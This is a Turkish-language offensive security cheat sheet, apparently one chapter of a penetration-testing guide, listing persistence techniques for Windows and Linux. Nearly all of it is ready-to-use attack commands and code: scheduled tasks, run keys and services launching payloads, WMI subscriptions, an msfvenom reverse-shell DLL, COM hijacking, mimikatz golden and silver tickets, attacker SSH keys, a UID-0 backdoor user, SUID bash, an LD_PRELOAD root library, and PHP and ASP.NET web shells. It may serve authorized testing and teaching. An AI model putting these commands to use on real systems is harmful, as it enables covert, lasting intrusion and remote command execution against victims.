# 🔒 Faz 5: Kalıcılık Sağlama (Persistence)

[🇬🇧 English](../05-Persistence.md) • [🇮🇹 Versione Italiana](05-Persistence.it.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Hedef:** Sistemin yeniden başlatılması, oturumun kapatılması veya parola değişikliklerine karşı hedefe erişimi kalıcı hale getirmek.

---

## 🖥️ Windows Sistemlerinde Kalıcılık

### Zamanlanmış Görevler (Scheduled Tasks)
```cmd
# SYSTEM yetkisinde çalışan zamanlanmış görev oluşturma (Oturum açıldığında)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# Belirli bir kullanıcı oturumunda arka planda çalıştırma
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# Sistem açılışında çalıştırma (onstart)
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Her saat başı çalıştırma
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# Görevleri listeleme
schtasks /query /fo LIST /v

# Görevi silme
schtasks /delete /tn "TaskName" /f
```

### Kayıt Defteri (Registry Run Keys)
```cmd
# HKCU - Yalnızca mevcut kullanıcı (Admin yetkisi gerekmez)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM - Tüm kullanıcılar (Admin yetkisi gerekir)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (Tek sefer çalışır ve kendini siler)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell ile Run anahtarı ekleme
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Başlangıç Klasörü (Startup Folder)
```cmd
# Mevcut kullanıcı başlangıç klasörü
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Tüm kullanıcılar için ortak başlangıç klasörü (Admin gerekir)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell ile:
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Windows Servisleri
```cmd
# Otomatik başlayan yeni bir servis oluşturma (Admin gerekir)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Mevcut bir servisin ikili yolunu değiştirme
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell ile servis oluşturma
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### WMI Olay Abonelikleri (WMI Event Subscriptions)
Oldukça gizli ve dosyasız (fileless) kalıcılık yöntemi:

```powershell
# WMI Olay Filtresi (Event Filter) tanımlama (Örn: Her gün saat 12:00'de tetiklenir)
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

# Komut çalıştırıcı (Consumer) tanımlama
$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# Filtre ile çalıştırıcıyı birbirine bağlama (Binding)
$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### DLL Hijacking / Arama Sırası İstismarı
```cmd
# Servis veya uygulamanın aradığı eksik DLL dosyasını tespit edin
# Zararlı DLL'i hedef dizine yerleştirin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### COM Nesnesi Ele Geçirme (COM Hijacking)
```powershell
# İlgili COM nesnelerini bulma
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Hijack anahtarını oluşturma
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden & Silver Ticket ile Domain Kalıcılığı
```powershell
# Golden Ticket (krbtgt hash'i ile 10 yıllık domain admin erişimi)
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket (Servis hash'i ile hedef sunucuda kesintisiz erişim)
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Linux Sistemlerinde Kalıcılık

### Cron Görevleri (Cron Jobs)
```bash
# Kullanıcı bazlı crontab
crontab -e
# Ekleyin: * * * * * /tmp/shell.sh

# Sistem genelindeki crontab dosyasına root komutu ekleme
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Saatlik / günlük cron klasörlerine script ekleme
echo -e "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### SSH Yetkili Anahtarları (Authorized Keys)
```bash
# Kendi açık anahtarınızı (public key) hedefe ekleyin
echo "ssh-rsa AAAA...kendi_anahtariniz... saldirgan@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root kullanıcısının anahtarlarına ekleme
echo "ssh-rsa AAAA...kendi_anahtariniz..." >> /root/.ssh/authorized_keys
```

### Arka Kapı Kullanıcısı (Backdoor User)
```bash
# UID ve GID 0 (root) olan gizli bir kullanıcı oluşturma
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:Parola123!" | chpasswd

# Veya doğrudan /etc/passwd dosyasına ekleme
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### SUID Bash Arka Kapısı
```bash
# Bash kabuğunu kopyalayıp gizli SUID yetkisi verme
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# İhtiyaç duyulduğunda root olarak çalıştırma
/tmp/.hidden -p
```

### Systemd Servisi Olarak Kalıcılık
```bash
# Servis yapılandırma dosyası oluşturma
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Servisi etkinleştirme ve başlatma
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### Oturum Başlatma Dosyaları (bashrc / profile)
```bash
# Kullanıcının ~/.bashrc dosyasına ekleme (Terminal açıldığında çalışır)
echo '/tmp/shell &' >> ~/.bashrc

# Tüm kullanıcılar için genel profile ekleme
echo '/tmp/shell &' >> /etc/profile

# Giriş kabuğu dosyasına ekleme
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD ile Dinamik Kütüphane İstismarı
```bash
# Zararlı paylaşımlı kütüphane oluşturma
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Kütüphaneyi ld.so.preload dosyasına ekleme
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Web Shell ile Kalıcılık
```bash
# Basit PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# Gizlenmiş web shell örneği
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Web Tabanlı Kalıcılık

### Yaygın Web Shell Konumları
```bash
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### ASP.NET (IIS) Web Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 Hızlı Başvuru Tablosu

### Windows Kalıcılık Yöntemleri

| Yöntem | Konum | Gereken Yetki |
|--------|-------|---------------|
| Registry Run | HKCU / HKLM | User / Admin |
| Scheduled Task | Task Scheduler | User / Admin |
| Startup Folder | AppData / ProgramData | User / Admin |
| Windows Service | Services | Admin |
| WMI Subscription | WMI Veritabanı | Admin |
| COM Hijacking | HKCU CLSID | User |

### Linux Kalıcılık Yöntemleri

| Yöntem | Konum | Gereken Yetki |
|--------|-------|---------------|
| Cron Job | /etc/crontab veya user crontab | root / User |
| SSH Keys | ~/.ssh/authorized_keys | User |
| SUID Binary | +s izinli dosya | root |
| Systemd Service | /etc/systemd/system | root |
| bashrc / profile | ~/.bashrc veya /etc/profile | User / root |

---

## 🔗 İlgili Kılavuzlar

- [PowerShell](../../PowerShell/README.md)
- [Linux Komutları](../../Linux-Commands/README.md)
- [Metasploit](../../Metasploit/README.md)

---

**Önceki Aşama:** [← 04 - Yatay İlerleme (Lateral Movement)](./04-Lateral-Movement.tr.md)  
**Sonraki Aşama:** [06 - Savunma Atlatma (Defense Evasion) →](./06-Defense-Evasion.tr.md)
